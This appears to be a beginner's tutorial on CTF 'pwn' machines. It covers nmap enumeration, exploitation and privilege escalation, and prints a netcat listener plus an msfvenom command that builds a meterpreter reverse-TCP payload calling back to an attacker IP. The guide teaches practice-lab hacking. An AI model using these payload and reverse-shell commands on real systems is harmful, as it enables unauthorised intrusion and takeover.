# Introduction
A beginner's guide to Pwn Challenges

Pwning is a term derived from gaming, referring to dominating or defeating someone or something. In cybersecurity, pwning refers to completely hacking a machine, typically upto the root level.<br/>
These challenges demand that a hacker have knowledge on computer systems and how to exploit various flaws in the security system such as security misconfigurations, usage of outdated programs and improper control of access. These types of challenges provide a variety of virtual machines to practice various paradigms and principles of Ethical Hacking and Penetration testing.

These machines can be pwned by following the basic steps of Ethical Hacking: <br/>
1. Enumeration
2. Exploitation
3. Privilege Escalation

## Enumeration
This step is probably the most crucial step and will determine the difficulty of the rest of the challenge to come. It primarily involves scanning a given server or a machine for open ports and finding out information about thr services running on these ports.<br/>

This can be achieved through the use of various tools, the most popular one being **nmap**. <br/>
A command in nmap would look something like this: <br/>
```bash
nmap -v -sT 10.10.2.144
```
<br/>

This will scan the 1000 most used ports on the machine and run default scripts on each port. This could output something as follows<br/>
<br/>
![Nmap Scan](https://media.geeksforgeeks.org/wp-content/uploads/20220704165316/connectss.jpg)

<br/>
After this we explore the programs running on various ports, searching for different types of security flaws that can be exploited in order to gain access to the machine.

## Exploitation
Exploitation refers to exploiting the vulnerabilities found through enumeration. This can usually be found through **known vulnerabilities (CVEs)** of the components running on the machine.<br/>
</br>
With respect to pwnable machines, these typically involve some form of credential disclosure or an RCE (Remote Code Execution) vulnerability which gives access to a reverse shell, allowing us to directly run code on the machine. Vulnerabilities can also take the form of malicious file uploads, which allow the hacker to upload a malicious file which will be run on the target machine, providing access to the reverse shell on the machine.

Some tools that can be used for exploitation include the **Metasploit Framework**, or **msfvenom** which is a tool for generating malicious payloads.


![Metasploit Framework](https://www.imperva.com/learn/wp-content/uploads/sites/13/2022/04/Screen-Shot-2022-04-03-at-14.41.09.png)

Tools like **netcat** allow us to listen for connection from machines, allowing the spawning of a reverse shell. A netcat command looks like this:<br/>
```console
netcat -lvnp 4444
``` 


Tools like msfvenom can be used to generate malicious payloads that allow the hacker to run various types of shells like **meterpreter**, standard **reverse tcp** or **bind shells** and many more. <br/>
```console 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.123.234 LPORT=4444 -f out > shell.out
```

The above command generates a **meterpreter** shell for linux distributions based on the x86 architecture. This will be uploaded to the target machine, which will allow us to intercept the reverse shell using the metasploit framework. From here, if possible we can extract the user credentials of the machine, allowing us to connect to the machine via **ssh**.

After this step, in the context of CTFs the hacker can now find the user flag.


## Privilege Escalation
Privilege Escalation refers to the act of elevating privileges after gaining access, from a standard user to root. Gaining root privileges allows a hacker to completely take control of the system, extract any type of data or modify the system in any way.

The first step of privilege escalation is to identify what scripts can be run by a standard user with root privileges. Usually these scripts will also allow some type of code execution.
This can be achieved by using the following command:

```bash
sudo -l
```

This is the most ambiguous part of the hacking process, as there are infinetly many ways to escalate privileges from a standard user to root. However, some Privilege Escalation vectors can be automatically found using tools like **linpeas**.

If you are using the metasploit framework to gain access to the machine through a meterpreter shell, we can also try and use the `getsystem` command to try some standard privilege escalation exploits.

![](https://tbhaxor.com/content/images/2021/08/image-66.png)

Once you escalate your privileges, the challenge is complete, because all files are accessible and the system is said to be completely pwned.
